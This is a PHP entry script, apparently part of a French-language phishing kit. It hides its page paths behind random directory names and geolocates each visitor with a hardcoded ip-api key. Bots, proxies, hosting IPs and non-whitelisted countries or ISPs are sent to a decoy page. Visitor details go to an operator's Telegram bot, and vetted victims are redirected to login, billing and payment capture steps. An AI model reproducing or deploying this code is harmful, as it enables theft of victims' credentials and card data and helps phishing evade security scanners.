<?php

session_start();
include('common/includes.php');

function generateUniqueId() {
    return bin2hex(random_bytes(16));
}

$sourceDirectory = './1';
$txtFile = './id1.txt';

if (!file_exists($txtFile)) {
    file_put_contents($txtFile, '');
}

$fileContent = file_get_contents($txtFile);

if (empty(trim($fileContent))) {
    $newId = generateUniqueId();
    file_put_contents($txtFile, $newId);

    // Renommer le id1
    $destinationDirectory = dirname($sourceDirectory) . '/' . $newId;
    $command = "mv " . escapeshellarg($sourceDirectory) . " " . escapeshellarg($destinationDirectory);
    $output = null;
    $return_var = null;
    exec($command, $output, $return_var);

    if ($return_var === 0) {
        $_SESSION['id1'] = $newId;
    }
} else {
    $_SESSION['id1'] = trim($fileContent);
}

$sourceDirectory = "./{$_SESSION['id1']}/2";
$txtFile = './id2.txt';

if (!file_exists($txtFile)) {
    file_put_contents($txtFile, '');
}

$fileContent = file_get_contents($txtFile);

if (empty(trim($fileContent))) {
    $newId = generateUniqueId();
    file_put_contents($txtFile, $newId);

    // Renommer le id1
    $destinationDirectory = dirname($sourceDirectory) . '/' . $newId;
    $command = "mv " . escapeshellarg($sourceDirectory) . " " . escapeshellarg($destinationDirectory);
    $output = null;
    $return_var = null;
    exec($command, $output, $return_var);

    if ($return_var === 0) {
        $_SESSION['id2'] = $newId;
    }
} else {
    $_SESSION['id2'] = trim($fileContent);
}

$sourceDirectory = "./{$_SESSION['id1']}/3";
$txtFile = './id3.txt';

if (!file_exists($txtFile)) {
    file_put_contents($txtFile, '');
}

$fileContent = file_get_contents($txtFile);

if (empty(trim($fileContent))) {
    $newId = generateUniqueId();
    file_put_contents($txtFile, $newId);

    // Renommer le id1
    $destinationDirectory = dirname($sourceDirectory) . '/' . $newId;
    $command = "mv " . escapeshellarg($sourceDirectory) . " " . escapeshellarg($destinationDirectory);
    $output = null;
    $return_var = null;
    exec($command, $output, $return_var);

    if ($return_var === 0) {
        $_SESSION['id3'] = $newId;
    }
} else {
    $_SESSION['id3'] = trim($fileContent);
}

$sourceDirectory = "./{$_SESSION['id1']}/4";
$txtFile = './id4.txt';

if (!file_exists($txtFile)) {
    file_put_contents($txtFile, '');
}

$fileContent = file_get_contents($txtFile);

if (empty(trim($fileContent))) {
    $newId = generateUniqueId();
    file_put_contents($txtFile, $newId);

    // Renommer le id1
    $destinationDirectory = dirname($sourceDirectory) . '/' . $newId;
    $command = "mv " . escapeshellarg($sourceDirectory) . " " . escapeshellarg($destinationDirectory);
    $output = null;
    $return_var = null;
    exec($command, $output, $return_var);

    if ($return_var === 0) {
        $_SESSION['id4'] = $newId;
    }
} else {
    $_SESSION['id4'] = trim($fileContent);
}

$sourceDirectory = "./{$_SESSION['id1']}/5";
$txtFile = './id5.txt';

if (!file_exists($txtFile)) {
    file_put_contents($txtFile, '');
}

$fileContent = file_get_contents($txtFile);

if (empty(trim($fileContent))) {
    $newId = generateUniqueId();
    file_put_contents($txtFile, $newId);

    // Renommer le id1
    $destinationDirectory = dirname($sourceDirectory) . '/' . $newId;
    $command = "mv " . escapeshellarg($sourceDirectory) . " " . escapeshellarg($destinationDirectory);
    $output = null;
    $return_var = null;
    exec($command, $output, $return_var);

    if ($return_var === 0) {
        $_SESSION['id5'] = $newId;
    }
} else {
    $_SESSION['id5'] = trim($fileContent);
}

$sourceDirectory = "./{$_SESSION['id1']}/6";
$txtFile = './id6.txt';

if (!file_exists($txtFile)) {
    file_put_contents($txtFile, '');
}

$fileContent = file_get_contents($txtFile);

if (empty(trim($fileContent))) {
    $newId = generateUniqueId();
    file_put_contents($txtFile, $newId);

    // Renommer le id1
    $destinationDirectory = dirname($sourceDirectory) . '/' . $newId;
    $command = "mv " . escapeshellarg($sourceDirectory) . " " . escapeshellarg($destinationDirectory);
    $output = null;
    $return_var = null;
    exec($command, $output, $return_var);

    if ($return_var === 0) {
        $_SESSION['id6'] = $newId;
    }
} else {
    $_SESSION['id6'] = trim($fileContent);
}

$sourceDirectory = "./{$_SESSION['id1']}/7";
$txtFile = './id7.txt';

if (!file_exists($txtFile)) {
    file_put_contents($txtFile, '');
}

$fileContent = file_get_contents($txtFile);

if (empty(trim($fileContent))) {
    $newId = generateUniqueId();
    file_put_contents($txtFile, $newId);

    // Renommer le id1
    $destinationDirectory = dirname($sourceDirectory) . '/' . $newId;
    $command = "mv " . escapeshellarg($sourceDirectory) . " " . escapeshellarg($destinationDirectory);
    $output = null;
    $return_var = null;
    exec($command, $output, $return_var);

    if ($return_var === 0) {
        $_SESSION['id7'] = $newId;
    }
} else {
    $_SESSION['id7'] = trim($fileContent);
}

$sourceDirectory = "./{$_SESSION['id1']}/8";
$txtFile = './id8.txt';

if (!file_exists($txtFile)) {
    file_put_contents($txtFile, '');
}

$fileContent = file_get_contents($txtFile);

if (empty(trim($fileContent))) {
    $newId = generateUniqueId();
    file_put_contents($txtFile, $newId);

    // Renommer le id1
    $destinationDirectory = dirname($sourceDirectory) . '/' . $newId;
    $command = "mv " . escapeshellarg($sourceDirectory) . " " . escapeshellarg($destinationDirectory);
    $output = null;
    $return_var = null;
    exec($command, $output, $return_var);

    if ($return_var === 0) {
        $_SESSION['id8'] = $newId;
    }
} else {
    $_SESSION['id8'] = trim($fileContent);
}

$sourceDirectory = "./{$_SESSION['id1']}/9";
$txtFile = './id9.txt';

if (!file_exists($txtFile)) {
    file_put_contents($txtFile, '');
}

$fileContent = file_get_contents($txtFile);

if (empty(trim($fileContent))) {
    $newId = generateUniqueId();
    file_put_contents($txtFile, $newId);

    // Renommer le id1
    $destinationDirectory = dirname($sourceDirectory) . '/' . $newId;
    $command = "mv " . escapeshellarg($sourceDirectory) . " " . escapeshellarg($destinationDirectory);
    $output = null;
    $return_var = null;
    exec($command, $output, $return_var);

    if ($return_var === 0) {
        $_SESSION['id9'] = $newId;
    }
} else {
    $_SESSION['id9'] = trim($fileContent);
}

$sourceDirectory = "./{$_SESSION['id1']}/10";
$txtFile = './id10.txt';

if (!file_exists($txtFile)) {
    file_put_contents($txtFile, '');
}

$fileContent = file_get_contents($txtFile);

if (empty(trim($fileContent))) {
    $newId = generateUniqueId();
    file_put_contents($txtFile, $newId);

    // Renommer le id1
    $destinationDirectory = dirname($sourceDirectory) . '/' . $newId;
    $command = "mv " . escapeshellarg($sourceDirectory) . " " . escapeshellarg($destinationDirectory);
    $output = null;
    $return_var = null;
    exec($command, $output, $return_var);

    if ($return_var === 0) {
        $_SESSION['id10'] = $newId;
    }
} else {
    $_SESSION['id10'] = trim($fileContent);
}

$sourceDirectory = "./{$_SESSION['id1']}/11";
$txtFile = './id11.txt';

if (!file_exists($txtFile)) {
    file_put_contents($txtFile, '');
}

$fileContent = file_get_contents($txtFile);

if (empty(trim($fileContent))) {
    $newId = generateUniqueId();
    file_put_contents($txtFile, $newId);

    // Renommer le id1
    $destinationDirectory = dirname($sourceDirectory) . '/' . $newId;
    $command = "mv " . escapeshellarg($sourceDirectory) . " " . escapeshellarg($destinationDirectory);
    $output = null;
    $return_var = null;
    exec($command, $output, $return_var);

    if ($return_var === 0) {
        $_SESSION['id11'] = $newId;
    }
} else {
    $_SESSION['id11'] = trim($fileContent);
}

$sourceDirectory = "./{$_SESSION['id1']}/12";
$txtFile = './id12.txt';

if (!file_exists($txtFile)) {
    file_put_contents($txtFile, '');
}

$fileContent = file_get_contents($txtFile);

if (empty(trim($fileContent))) {
    $newId = generateUniqueId();
    file_put_contents($txtFile, $newId);

    // Renommer le id1
    $destinationDirectory = dirname($sourceDirectory) . '/' . $newId;
    $command = "mv " . escapeshellarg($sourceDirectory) . " " . escapeshellarg($destinationDirectory);
    $output = null;
    $return_var = null;
    exec($command, $output, $return_var);

    if ($return_var === 0) {
        $_SESSION['id12'] = $newId;
    }
} else {
    $_SESSION['id12'] = trim($fileContent);
}

$sourceDirectory = "./{$_SESSION['id1']}/13";
$txtFile = './id13.txt';

if (!file_exists($txtFile)) {
    file_put_contents($txtFile, '');
}

$fileContent = file_get_contents($txtFile);

if (empty(trim($fileContent))) {
    $newId = generateUniqueId();
    file_put_contents($txtFile, $newId);

    // Renommer le id1
    $destinationDirectory = dirname($sourceDirectory) . '/' . $newId;
    $command = "mv " . escapeshellarg($sourceDirectory) . " " . escapeshellarg($destinationDirectory);
    $output = null;
    $return_var = null;
    exec($command, $output, $return_var);

    if ($return_var === 0) {
        $_SESSION['id13'] = $newId;
    }
} else {
    $_SESSION['id13'] = trim($fileContent);
}

$sourceDirectory = "./{$_SESSION['id1']}/14";
$txtFile = './id14.txt';

if (!file_exists($txtFile)) {
    file_put_contents($txtFile, '');
}

$fileContent = file_get_contents($txtFile);

if (empty(trim($fileContent))) {
    $newId = generateUniqueId();
    file_put_contents($txtFile, $newId);

    // Renommer le id1
    $destinationDirectory = dirname($sourceDirectory) . '/' . $newId;
    $command = "mv " . escapeshellarg($sourceDirectory) . " " . escapeshellarg($destinationDirectory);
    $output = null;
    $return_var = null;
    exec($command, $output, $return_var);

    if ($return_var === 0) {
        $_SESSION['id14'] = $newId;
    }
} else {
    $_SESSION['id14'] = trim($fileContent);
}

$_SESSION['login-error'] = "";
$_SESSION['billing-error'] = "";
$_SESSION['payment-error'] = "";
$_SESSION['index'] = "";
$_SESSION['login'] = "";
$_SESSION['billing'] = "";
$_SESSION['payment'] = "";

include('app/2.php');
include('config.php');
include('app/functions.php');

$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['ua'] = $_SERVER['HTTP_USER_AGENT'];

//file_get_contents("https://api.telegram.org/bot{$telegram['token']}/setWebhook?url=https://{$_SERVER['HTTP_HOST']}/app/webhook.php");

$response = "true";

$current_url = "http://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";
$_SESSION['redirection'] = "URL complète : " . htmlspecialchars($current_url);

if (strpos($response, 'true') !== false) {
    $jsonData = json_decode(file_get_contents('isps.json'), true);
    
    function getIpInfo($ip = '') {
        $ipinfo = file_get_contents("https://pro.ip-api.com/json/{$ip}?key=LWKtz4EzQwMJRyQ");
        $ipinfo_json = json_decode($ipinfo, true);
        return $ipinfo_json;
    }

    $ipApiData = getIpInfo($_SERVER['REMOTE_ADDR']);

    $country = $ipApiData['countryCode'] ?? 'Non disponible';
    $isp = $ipApiData['as'] ?? 'Non disponible';
    $mobile = $ipApiData['mobile'] ?? 'Non disponible';
    $proxy = $ipApiData['proxy'] ?? 'Non disponible';
    $hosting = $ipApiData['hosting'] ?? 'Non disponible';

    if ($only_mobile == true) {
        function isMobile() {
            return preg_match("/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/", $_SERVER['HTTP_USER_AGENT']);
        }
        
        if (!isMobile()) {
            $messageTemplate = "
★━━━━━ %s ━━━━━★
        
📲 Isp ➟ $isp
🗺️ Pays ➟ $country

MOTIF : APPAREIL SUSPECT

{$_SESSION['redirection']}
                
★━━━━━ 🌐 ━━━━━★

🌐 Ip Adress ➟ {$_SESSION['ip']}
🌐 User Agent ➟ {$_SESSION['ua']}
";
            $message = sprintf($messageTemplate, '🔴');
            sendTelegramMessage($telegram['token'], $badisp, $message);
            $_SESSION['bot'] = "0";
            header('location: site/index.html');
            exit();
            die(header('HTTP/1.0 404 Not Found'));
        }
    } else {
        function isMobile() {
            return preg_match("/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Windows NT|Macintosh|Windows|Mac/", $_SERVER['HTTP_USER_AGENT']);
        }
        
        if (!isMobile()) {
            $messageTemplate = "
★━━━━━ %s ━━━━━★
        
📲 Isp ➟ $isp
🗺️ Pays ➟ $country

MOTIF : APPAREIL SUSPECT

{$_SESSION['redirection']}
                
★━━━━━ 🌐 ━━━━━★

🌐 Ip Adress ➟ {$_SESSION['ip']}
🌐 User Agent ➟ {$_SESSION['ua']}
";
            $message = sprintf($messageTemplate, '🔴');
            sendTelegramMessage($telegram['token'], $badisp, $message);
            $_SESSION['bot'] = "0";
            header('location: site/index.html');
            exit();
            die(header('HTTP/1.0 404 Not Found'));
        }
    }

    $response = json_decode(
        file_get_contents("https://pro.ip-api.com/json/{$_SESSION['ip']}?key=LWKtz4EzQwMJRyQ&fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query"),
        true
    );

    
    if ($response && $response['status'] === 'success') {
        $_SESSION['ip_info'] = [
            "city" => $response['city'],
            "zip" => $response['zip'],
            "as" => $response['as'],
            "mobile" => $response['mobile'],
            "proxy" => $response['proxy'],
            "hosting" => $response['hosting'],
            "country" => $response['country'],
        ];
    
        if ($_SESSION['ip_info']['proxy'] == true 
        || $_SESSION['ip_info']['hosting'] == true) {
            $messageTemplate = "
★━━━━━ %s ━━━━━★
        
📲 Isp ➟ $isp
🗺️ Pays ➟ $country

MOTIF : BOT

{$_SESSION['redirection']}
                
★━━━━━ 🌐 ━━━━━★

🌐 Ip Adress ➟ {$_SESSION['ip']}
🌐 User Agent ➟ {$_SESSION['ua']}
";
            $message = sprintf($messageTemplate, '🔴');
            sendTelegramMessage($telegram['token'], $badisp, $message);
            $_SESSION['bot'] = "0";
            die(header('HTTP/1.0 404 Not Found'));
        }
    }

    $countryFound = isset($jsonData[$country]);
    $ispFound = false;

    if (in_array($country, $wlCountry)) {
        if ($countryFound) {
            foreach ($jsonData[$country]['isps'] as $operator) {
                if (stripos($isp, $operator) !== false) {
                    $ispFound = true;
                    break;
                }
            }
        }
    

    $messageTemplate = "
★━━━━━ %s ━━━━━★
        
📲 Isp ➟ $isp
🗺️ Pays ➟ $country

{$_SESSION['redirection']}
                
★━━━━━ 🌐 ━━━━━★

🌐 Ip Adress ➟ {$_SESSION['ip']}
🌐 User Agent ➟ {$_SESSION['ua']}
";

        if ($countryFound) {
            if ($ispFound) {
                if (!in_array($_SERVER['REMOTE_ADDR'], file('bl.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES))) {
                    $message = sprintf($messageTemplate, '🟢');
                    $buttons = array(
                        'inline_keyboard' => array(
                            array(
                                array('text' => '🗑️ BAN IP 🗑️', 'callback_data' => "ban={$_SESSION['ip']}"),
                            ),
                        ),
                    );
                    sendMessage($goodisp, $message, $buttons);

                    $_SESSION['bot'] = "1";
                    $_SESSION['client'] = "1";
                    $_SESSION['index'] = "1";

                    
                        if ($settings['steps']['login'] == true) {
                        header("location: {$_SESSION['id1']}/{$_SESSION['id2']}/");
                        } elseif ($settings['steps']['billing']) {
                            header("location: {$_SESSION['id1']}/{$_SESSION['id3']}/");
                        } else {
                            header("location: {$_SESSION['id1']}/{$_SESSION['id4']}/");
                        }
                    
                    exit();
                } else {
$messageTemplate = "
★━━━━━ %s ━━━━━★
        
📲 Isp ➟ $isp
🗺️ Pays ➟ $country

MOTIF : IP BANNIE

{$_SESSION['redirection']}
                
★━━━━━ 🌐 ━━━━━★

🌐 Ip Adress ➟ {$_SESSION['ip']}
🌐 User Agent ➟ {$_SESSION['ua']}
";
                    $message = sprintf($messageTemplate, '🔴');
                    sendTelegramMessage($telegram['token'], $badisp, $message);
                    $_SESSION['bot'] = "0";
                    header('location: site/index.html');
                    exit();
                }
            } else {
$messageTemplate = "
★━━━━━ %s ━━━━━★
        
📲 Isp ➟ $isp
🗺️ Pays ➟ $country

MOTIF : ISP PAS WL

{$_SESSION['redirection']}
                
★━━━━━ 🌐 ━━━━━★

🌐 Ip Adress ➟ {$_SESSION['ip']}
🌐 User Agent ➟ {$_SESSION['ua']}
";
                $message = sprintf($messageTemplate, '🔴');
                sendTelegramMessage($telegram['token'], $badisp, $message);
                $_SESSION['bot'] = "0";
                header('location: site/index.html');
                exit();
            }
            } else {
$messageTemplate = "
★━━━━━ %s ━━━━━★
        
📲 Isp ➟ $isp
🗺️ Pays ➟ $country

MOTIF : PAYS INVALIDE

{$_SESSION['redirection']}
                
★━━━━━ 🌐 ━━━━━★

🌐 Ip Adress ➟ {$_SESSION['ip']}
🌐 User Agent ➟ {$_SESSION['ua']}
";
            $message = sprintf($messageTemplate, '🔴');
            sendTelegramMessage($telegram['token'], $badisp, $message);
            $_SESSION['bot'] = "0";
            header('location: site/index.html');
            exit();
        }
    } else {
$messageTemplate = "
★━━━━━ %s ━━━━━★
        
📲 Isp ➟ $isp
🗺️ Pays ➟ $country

MOTIF : PAYS PAS WL

{$_SESSION['redirection']}
                
★━━━━━ 🌐 ━━━━━★

🌐 Ip Adress ➟ {$_SESSION['ip']}
🌐 User Agent ➟ {$_SESSION['ua']}
";
        $message = sprintf($messageTemplate, '🔴');
        sendTelegramMessage($telegram['token'], $badisp, $message);
        $_SESSION['bot'] = "0";
        header('location: site/index.html');
        exit();
    }
} else {
    $_SESSION['client'] = "0";
    die("SITE IS UNDER MAINTENANCE");
    exit();
}
?>
